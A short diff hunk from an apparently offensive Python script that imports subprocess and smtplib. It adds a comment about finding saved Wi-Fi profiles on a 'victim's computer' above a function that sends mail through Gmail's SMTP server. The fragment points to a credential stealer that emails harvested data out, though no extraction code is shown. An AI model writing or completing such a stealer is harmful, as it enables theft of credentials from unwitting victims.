@@ -4,6 +4,8 @@ import subprocess
 import smtplib
 import re
 
+# Find all saved wifi`s profiles on victim`s computer
+
 
 def send_mail(email, password, message):
     server = smtplib.SMTP("smtp.gmail.com", 587,)
